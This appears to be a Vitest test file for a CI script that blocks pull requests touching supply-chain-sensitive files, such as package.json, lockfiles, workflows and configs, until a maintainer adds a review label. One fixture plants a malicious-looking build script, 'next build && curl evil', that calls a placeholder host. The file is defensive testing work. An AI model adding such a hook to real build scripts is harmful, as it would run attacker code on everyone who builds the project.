import { execFileSync, spawnSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import {
  MAX_DIFF_CHARS,
  REVIEW_LABEL,
  buildReport,
  formatChange,
  isWatched,
  packageJsonChanges,
  requiresReview,
  truncateDiff,
  watchedFiles,
} from './check-supply-chain-changes.mjs'

// Vitest runs from the repo root; import.meta.url is not a file URL under jsdom.
const SCRIPT = path.resolve(process.cwd(), 'scripts/check-supply-chain-changes.mjs')

describe('isWatched and watchedFiles', () => {
  it('watches files whose change can run code or alter checks', () => {
    for (const f of [
      'package.json',
      'bun.lock',
      '.husky/pre-commit',
      '.github/workflows/ci.yml',
      'eslint.config.mjs',
      'next.config.ts',
      'vitest.config.mts',
      'vitest.setup.ts',
      'playwright.chain.config.ts',
      'postcss.config.mjs',
      'scripts/check-type-coverage.mjs',
      'bunfig.toml',
      '.npmrc',
      '.github/CODEOWNERS',
      '.github/dependabot.yml',
      '.github/actions/setup/action.yml',
    ]) {
      expect(isWatched(f), f).toBe(true)
    }
  })

  it('does not watch ordinary app source or docs', () => {
    expect(isWatched('src/lib/api.ts')).toBe(false)
    expect(isWatched('README.md')).toBe(false)
    expect(isWatched('messages/en.json')).toBe(false)
  })

  it('filters a changed-file list down to watched files', () => {
    expect(watchedFiles(['src/a.ts', 'package.json', 'scripts/x.mjs'])).toEqual([
      'package.json',
      'scripts/x.mjs',
    ])
  })
})

describe('requiresReview', () => {
  it('blocks a watched change without the review label', () => {
    expect(requiresReview(['package.json'], [])).toBe(true)
  })

  it('passes once a maintainer applies the review label', () => {
    expect(requiresReview(['package.json'], [REVIEW_LABEL])).toBe(false)
  })

  it('ignores an existing label on a new push so new commits need a fresh review', () => {
    expect(requiresReview(['package.json'], [REVIEW_LABEL], 'synchronize')).toBe(true)
    expect(requiresReview(['package.json'], [REVIEW_LABEL], 'labeled')).toBe(false)
    expect(requiresReview(['src/app.ts'], [], 'synchronize')).toBe(false)
  })

  it('never blocks a PR that changes no watched files', () => {
    expect(requiresReview(['src/a.ts'], [])).toBe(false)
  })
})

describe('packageJsonChanges', () => {
  const base = JSON.stringify({
    scripts: { build: 'next build', dev: 'next dev' },
    dependencies: { next: '16.0.0' },
  })

  it('reports a changed script verbatim', () => {
    const after = JSON.stringify({
      scripts: { build: 'next build && node x.js', dev: 'next dev' },
      dependencies: { next: '16.0.0' },
    })
    expect(packageJsonChanges(base, after)).toEqual([
      { section: 'scripts', key: 'build', before: 'next build', after: 'next build && node x.js' },
    ])
  })

  it('reports added and removed dependencies and sections', () => {
    const after = JSON.stringify({
      scripts: { build: 'next build' },
      dependencies: { next: '16.0.0', 'left-pad': '1.3.0' },
      trustedDependencies: ['esbuild'],
    })
    const changes = packageJsonChanges(base, after)
    expect(changes).toContainEqual({ section: 'dependencies', key: 'left-pad', after: '1.3.0' })
    expect(changes).toContainEqual({ section: 'scripts', key: 'dev', before: 'next dev' })
    expect(changes).toContainEqual({ section: 'trustedDependencies', key: '0', after: 'esbuild' })
  })

  it('returns nothing for identical content', () => {
    expect(packageJsonChanges(base, base)).toEqual([])
  })

  it('treats a missing file as empty and an unparsable file as empty', () => {
    expect(packageJsonChanges(undefined, base)).toHaveLength(3)
    expect(packageJsonChanges('{not json', base)).toHaveLength(3)
  })
})

describe('formatChange', () => {
  it('renders additions, removals and changes', () => {
    expect(formatChange({ section: 'scripts', key: 'build', before: 'a', after: 'b' })).toBe(
      '- scripts.build: "a" -> "b"',
    )
    expect(formatChange({ section: 'dependencies', key: 'x', after: '1.0.0' })).toBe(
      '- dependencies.x: (none) -> "1.0.0"',
    )
    expect(formatChange({ section: 'dependencies', key: 'x', before: '1.0.0' })).toBe(
      '- dependencies.x: "1.0.0" -> (none)',
    )
  })
})

describe('truncateDiff', () => {
  it('leaves short diffs alone and cuts long ones with a note', () => {
    expect(truncateDiff('+a')).toBe('+a')
    const long = 'x'.repeat(MAX_DIFF_CHARS + 10)
    const cut = truncateDiff(long)
    expect(cut.startsWith('x'.repeat(MAX_DIFF_CHARS))).toBe(true)
    expect(cut).toContain('10 more characters')
  })
})

describe('buildReport', () => {
  it('says so when no watched files changed', () => {
    expect(buildReport([], [], false)).toContain('No watched files changed.')
  })

  it('explains the block and shows package.json changes and the raw diff', () => {
    const report = buildReport(
      [{ file: 'package.json', diff: '-  "build": "next build"\n+  "build": "x"' }],
      [{ section: 'scripts', key: 'build', before: 'next build', after: 'x' }],
      true,
    )
    expect(report).toContain('**Blocked:**')
    expect(report).toContain('- scripts.build: "next build" -> "x"')
    expect(report).toContain('#### package.json')
    expect(report).toContain('```diff')
  })

  it('says the check passes when the label is present', () => {
    const report = buildReport([{ file: 'bun.lock', diff: '' }], [], false)
    expect(report).toContain(`Label \`${REVIEW_LABEL}\` is present`)
    expect(report).toContain('(no textual changes)')
  })
})

describe('check-supply-chain-changes.mjs (in a git repo)', () => {
  const git = (cwd: string, args: string[]) =>
    execFileSync('git', args, { cwd, encoding: 'utf8' }).trim()

  function makeRepo() {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'supply-chain-'))
    git(dir, ['init', '-q'])
    git(dir, ['config', 'user.email', 'test@example.com'])
    git(dir, ['config', 'user.name', 'test'])
    fs.writeFileSync(
      path.join(dir, 'package.json'),
      JSON.stringify({ scripts: { build: 'next build' } }, null, 2),
    )
    fs.writeFileSync(path.join(dir, 'README.md'), '# repo\n')
    git(dir, ['add', '.'])
    git(dir, ['commit', '-q', '-m', 'base'])
    const base = git(dir, ['rev-parse', 'HEAD'])
    return { dir, git, base }
  }

  function commitChange(dir: string, file: string, content: string) {
    fs.writeFileSync(path.join(dir, file), content)
    git(dir, ['add', '.'])
    git(dir, ['commit', '-q', '-m', `change ${file}`])
    return git(dir, ['rev-parse', 'HEAD'])
  }

  function runCheck(dir: string, base: string, head: string, labels: string[]) {
    return spawnSync(process.execPath, [SCRIPT, base, head], {
      cwd: dir,
      encoding: 'utf8',
      env: { ...process.env, PR_LABELS: JSON.stringify(labels), GITHUB_STEP_SUMMARY: '' },
    })
  }

  it('fails a PR that edits package.json scripts until labelled', () => {
    const repo = makeRepo()
    const head = commitChange(
      repo.dir,
      'package.json',
      JSON.stringify({ scripts: { build: 'next build && curl evil' } }, null, 2),
    )
    const blocked = runCheck(repo.dir, repo.base, head, [])
    expect(blocked.status).toBe(1)
    expect(blocked.stdout).toContain('scripts.build')
    expect(blocked.stderr).toContain(REVIEW_LABEL)

    const passed = runCheck(repo.dir, repo.base, head, [REVIEW_LABEL])
    expect(passed.status).toBe(0)
  })

  it('passes a PR that touches no watched files', () => {
    const repo = makeRepo()
    const head = commitChange(repo.dir, 'README.md', '# changed\n')
    const result = runCheck(repo.dir, repo.base, head, [])
    expect(result.status).toBe(0)
    expect(result.stdout).toContain('No watched files changed.')
  })

  it('appends the report to the job summary when GITHUB_STEP_SUMMARY is set', () => {
    const repo = makeRepo()
    const head = commitChange(repo.dir, '.npmrc', 'ignore-scripts=false\n')
    const summary = path.join(repo.dir, 'summary.md')
    const result = spawnSync(process.execPath, [SCRIPT, repo.base, head], {
      cwd: repo.dir,
      encoding: 'utf8',
      env: { ...process.env, PR_LABELS: '[]', GITHUB_STEP_SUMMARY: summary },
    })
    expect(result.status).toBe(1)
    expect(fs.readFileSync(summary, 'utf8')).toContain('## Supply-chain changes in this PR')
  })

  it('exits 2 with usage when refs are missing', () => {
    const repo = makeRepo()
    expect(runCheck(repo.dir, '', '', []).status).toBe(2)
  })
})
